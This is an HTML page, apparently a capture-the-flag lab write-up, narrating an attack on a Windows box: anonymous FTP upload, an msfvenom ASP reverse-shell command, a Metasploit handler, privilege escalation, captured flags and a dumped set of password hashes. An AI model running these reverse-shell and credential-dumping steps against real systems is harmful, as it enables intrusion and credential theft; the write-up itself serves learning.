@@ -1,0 +1,105 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>port 21</title>
+</head><body><img src="image.png" /><br/>
+<br/>
+We start with logging to the ftwp with Anonymous user<br/>
+<br/>
+We downloaded the data to look for clues<br/>
+<img src="image 2.png" /><br/>
+<img src="image 3.png" /><br/>
+<br/>
+We used the put command and manage to add a file to the ftp<br/>
+<img src="image 4.png" /><br/>
+<img src="image 5.png" /><br/>
+<br/>
+Since we are able to put files and execute them, we can add malware to the website<br/>
+We are going to generate a malware, with msfvenom<br/>
+https://netsec.ws/?p=331<br/>
+Since it is a windows server we know it is using ASP<br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp<br/>
+<br/>
+<img src="image 6.png" /><br/>
+<br/>
+The above image did not work, we dont know if the windows system is a x64 or x86. WHen trying the above command our multi handler was listening and nothing happend. We then tried to do it again with a x86 <br/>
+<img src="image 18.png" /><br/>
+<br/>
+<img src="image 7.png" /><img src="image 19.png" width="450" height="198" /><br/>
+We have now created a file which will try to connect back to use.<br/>
+What we need next is a lisner, take can recevice this connection. <br/>
+We can use metasploits multi/handler for that<br/>
+<br/>
+<br/>
+<img src="image 8.png" /><br/>
+<br/>
+<br/>
+<img src="image 9.png" /><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+we can now try to put the malware on<br/>
+<img src="image 10.png" /><img src="image 20.png" /><br/>
+we got a meterpreter shell, we see that our system is a x86<br/>
+We also see that we are not root, so we need to find a way to privilege escalete<br/>
+<br/>
+<img src="image 11.png" /><br/>
+<br/>
+<br/>
+<br/>
+WE can see that we are not system <br/>
+<img src="image 13.png" /><br/>
+Meaning we can run some commands, we tried using getsystem but now luck.<br/>
+<br/>
+What we can try to do is to try run a post exploit which will try to find ways for us to be system,<br/>
+we but or current session in the background (ctrl+z, y) and go back to msfconsole <br/>
+<img src="image 14.png" /><br/>
+<img src="image 15.png" /><br/>
+<br/>
+<br/>
+<img src="image 16.png" /><br/>
+WE are not system(root)<br/>
+what we can do is to run a post exploit that will find ways for use to be system<br/>
+<br/>
+We could try all of them, but let go with of that works, the post module found ways for use to get root<br/>
+We tried the first suggestion<br/>
+<br/>
+<img src="image 12.png" /><br/>
+<br/>
+<img src="image 17.png" /><br/>
+<br/>
+This wont works insce the handler is using 192.168.1.134, this is not our local host, we need to <br/>
+show options -&gt; set lhost 10.10.14.14<br/>
+<br/>
+<img src="image 21.png" /><br/>
+<br/>
+port 4444 is already used<br/>
+<br/>
+<img src="image 22.png" /><br/>
+<br/>
+We got a meterpreter shell and this time we are root<br/>
+<img src="image 23.png" /><br/>
+<img src="image 24.png" /><br/>
+it seems to be a user with the name "babis" here lets hunt for flags, we go to c and tab for options<br/>
+<img src="image 25.png" /><br/>
+<br/>
+<img src="image 26.png" /><br/>
+root: e621a0b5041708797c4fc4728bc72b4b<br/>
+earlier we found a user named babies, we found her desktop and found the flag<br/>
+noticed the ".txt.txt"<br/>
+<img src="image 27.png" /><br/>
+user: 9ecdd6a3aedf24b41562fea70f4cb3e8<br/>
+<br/>
+Extra, but no luck<br/>
+meterpreter &gt; hashdump<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a450f6000be7df50ee304d0a838d638f:::<br/>
+babis:1000:aad3b435b51404eeaad3b435b51404ee:a1133ec0f7779e215acc8a36922acf57:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+<img src="image 28.png" /><br/>
+<img src="image 29.png" /><br/>
+<br/>
+<img src="image 30.png" /><br/>
+<br/>
+https://www.youtube.com/watch?v=ODUDau7BPSY&amp;ab_channel=TheCyberMentor</body></html>
